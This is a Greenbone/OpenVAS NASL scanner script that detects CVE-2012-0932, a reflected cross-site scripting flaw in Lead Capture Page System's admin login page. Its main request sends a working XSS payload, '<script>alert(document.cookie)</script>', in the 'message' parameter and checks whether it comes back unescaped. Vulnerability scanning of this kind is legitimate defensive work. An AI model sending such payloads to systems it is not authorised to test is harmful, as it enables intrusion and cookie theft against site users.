# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802577");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2012-0932");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-02-02 13:13:46 +0530 (Thu, 02 Feb 2012)");
  script_name("Lead Capture Page System 'message' Parameter Cross Site Scripting Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/47702");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51785");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/72623");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108887/leadcapturepagesystem-xss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in context of an affected site.");

  script_tag(name:"affected", value:"Lead Capture Page System");

  script_tag(name:"insight", value:"The flaw is due to an input passed to the 'message' parameter
  in 'admin/login.php' is not properly sanitised before being returned to the user.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Lead Capture Page System is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);

foreach dir (make_list_unique("/", "/leadcapturepagesystem", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  rcvRes = http_get_cache(item: dir + "/login.php", port:port);

  if(egrep(pattern:'Powered By <a href="http://leadcapturepagesystem.com/',
           string:rcvRes))
  {
    sndReq = string("GET ", dir, "/admin/login.php?message=<script>alert(",
                    "document.cookie)</script> HTTP/1.1", "\r\n",
                    "Host: ", host, "\r\n\r\n");
    rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

    if(rcvRes =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< rcvRes)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
